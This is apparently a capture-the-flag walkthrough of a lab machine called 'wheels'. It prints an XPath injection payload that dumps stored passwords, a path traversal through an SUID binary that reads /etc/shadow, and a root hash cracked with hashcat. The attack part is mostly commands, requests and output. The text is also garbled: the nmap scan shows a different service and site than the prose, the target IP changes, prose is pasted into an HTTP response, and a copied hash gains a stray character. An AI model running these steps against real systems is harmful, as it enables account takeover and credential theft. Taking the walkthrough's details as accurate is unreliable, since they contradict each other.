## Enumeration

We start the enumeration process with an `nmap` scan.

```
nmap -sC -sV 192.168.120.108
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 11:45 EDT
Nmap scan report for 192.168.120.108
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
| 256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_ 256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
8080/tcp open http Apache Tomcat 9.0.62
|_http-title: Transformers Collectibles
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We discover a webserver running on port 80. After opening it in a browser, we are directed to a homepage for a car service entitled `Wheels Car Service`

From here we run `gobuster` with `php` and `html` extensions enabled.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 192.168.120.108 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k
/portal.php (Status: 403) [Size: 277]
...
```

We discover a few php endpoints. Let's navigate to the `portal.php` page and see that it requires authentication.

We register with `test@test.com` and `12345` as the password and login.

We are unable to access `portal.php`, and receive an `Access Denied` message.

However, during our initial enumeration of the `portal.php` page, we saw a footer with the contact e-mail as `info@wheels.service`.

## Exploitation

Since there is no e-mail verification when registering, we can try registering with `test@wheels.service` and set our own password.

After logging in with `test@wheels.service`, we are able to successfully login and access the Employee portal.

The `portal.php` page has an option to filter users by services, specifically `car & bike`. After clicking on each filter, we see two sets of what appear to be usernames.

The car filter:

We can intercept the response of the `cars` filter using a proxy like `Burp Suite`, and forward the request to the repeater tab.

We notice that when we input anything other than `bike` or `car` in the `work` parameter, the response displays `XML Error; No asdas entity found`.

```
GET /portal.php?work=test&action=search HTTP/1.1
Host: 192.168.120.57
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=4pflsuvt1i0p075abblor609is
Upgrade-Insecure-Requests: 1
```

The response:

```
</tr>
............
XML Error; No test entity found
<tr  height="40">
............
```

### XPATH Injection

The previous error leads us to believe an XPATH Injection is a viable attack worth testing.

When passing `')] | //user/*[contains(*,'` in the `work` parameter (found from [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md)), the response displays 6 empty Boxes.

Let's attempt to fuzz this parameter with the following payload:

```
%27)%5D/password%20%7C%20a%5Bcontains(a,%27
```

We insert the payload into the `work` parameter

```
GET /portal.php?work=%27)%5D/password%20%7C%20a%5Bcontains(a,%27&action=search HTTP/1.1
Host: 192.168.120.57
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=4pflsuvt1i0p075abblor609is
Upgrade-Insecure-Requests: 1
```

This reveals a list of passwords that do not have any usernames associated with them.

```
Search users by services:After logging in with `test@wheels.service`, we are able to successfully login and access the Employee portal.

The `portal.php` page has an option to filter users by services, specifically `car & bike`. After clicking on each filter, we see two sets of what appear to be usernames.

The car filter: </b></td>
</tr>
XML Error; No ')]/password | a[contains(a,' entity found
<tr  height="40"  bgcolor="#c8dbde"  align="center">
<td>1</td>
<td  width="200"><b>Iamrockinginmyroom1212</b></td>
</tr>
<tr  height="40"  bgcolor="#c8dbde"  align="center">
<td>2</td>
<td  width="200"><b>iamarabbitholeand7875</b></td>
</tr>
<tr  height="40"  bgcolor="#c8dbde"  align="center">
<td>3</td>
<td  width="200"><b>johnloveseverontr8932</b></td>
</tr>
<tr  height="40"  bgcolor="#c8dbde"  align="center">
<td>4</td>
<td  width="200"><b>lokieismyfav!@#12</b></td>
</tr>
<tr  height="40"  bgcolor="#c8dbde"  align="center">
<td>5</td>
<td  width="200"><b>alreadydead$%^234</b></td>
</tr>
<tr  height="40"  bgcolor="#c8dbde"  align="center">
<td>6</td>
<td  width="200"><b>lasagama90809!@</b></td>
</tr>
```

The first Password in the list was `Iamrockinginmyroom1212` and the first name, when enabling the `car` filter, is `bob`. This may indicate this user has this password.

We can SSH into user `bob` with password `Iamrockinginmyroom1212` and gain a low privilege shell.

## Privilege Escalation

Navigating to the `/opt/` directory, we see a binary `get-list` with the `SUID` permission set to `root`

```
$ ls -la /opt
total 28
drwxr-xr-x 2 root root 4096 Mar 15 20:57 .
-rwsr-sr-x 1 root root 17336 Mar 15 17:03 get-list
```

Let's see what happens when we execute the binary.

```
$ ./get-list
Which List do you want to open? [customers/employees]:
```

It seems like the binary attempts to open a file,.

When we pass `users` as the input the response is `Oops something went wrong!`.

```
Which List do you want to open? [customers/employees]: users
Oops something went wrong!!$
```

But when we pass `employees;ls` as input, it immediately terminates the program without any error.

```
$ ./get-list
Which List do you want to open? [customers/employees]: employees;ls
$
```

### Reverse Engineering The Binary:

When the program asks us which list we want to open, it only accepts the specified amount as an input, making a buffer overflow a non-viable attack.

Next, it checks if any of the following characters are present: `;` `&` `|`.

If they are present, the program immediately terminates.

If they are not present, the program checks if either `customers` or `employees` options are present.

If neither are present, the programs prints `Oops something went wrong!!` and exits the program.

If those options are present, the program prints `Opening File....` and proceeds to `cat` out the `/root/details/%s`.

With this logic in mind, we can attempt to open the **/etc/passwd/** file with the following input:

```
$ ./get-list
Which List do you want to open? [customers/employees]: ../../etc/passwd #employees
Opening File....
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
bob:x:1000:1000::/home/bob:/bin/sh
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
```

We have successfully viewed the **/etc/passwd** file.

We can follow the same process to view **/etc/shadow**.

```
$ ./get-list
Which List do you want to open? [customers/employees]: ../../etc/shadow #employees
Opening File....
root:$6$jgsanIAwx1.w9V/.$cOWVUY1EiX.hbXPY//o8vDug9rIqLuzjs6KPzz6V8RM/4nK.Z1UXacdZW2Lj2J6yK/lZRC2uLbZ/bdEtWhbJu0:19066:0:99999:7:::
mysql:!:19066:0:99999:7:::
```

Now that we can view the root user's hash, we can attempt to crack it with `hashcat`.

```
root:$6$jgsanIAwx1.w9V/.$cOWVUY1EiX.hbXPY//o8vDug9rIqLuzjs6KPzz6V8RM/4nK.Z1UXacdZW2Lj2J6yK/lZRC2uLbZ/bdEtWhbJu0:19066:0:99999:7:::
```

First, we copy the hash to a file.

```
echo "$6$jgsanIAwx1.w9V/.$cOWVUY1EiX.hbXPY//o8vDug9rIqLuzjs6KPzz6V8RM/4nK.Z1UXacdZW2Lj2J6yK/lZRC2uLbZ/bdEtWhbJu0." > hash
```

```
hashcat -m 1800 -a 0 hash $rockyou --force -o cracked
...
$6$jgsanIAwx1.w9V/.$cOWVUY1EiX.hbXPY//o8vDug9rIqLuzjs6KPzz6V8RM/4nK.Z1UXacdZW2Lj2J6yK/lZRC2uLbZ/bdEtWhbJu0.:highschoolmusical
```

The password is `highschoolmusical`. We can `SSH` in as the root user.

```
$ su
Password:
root@wheels:/home/bob# whoami
root
```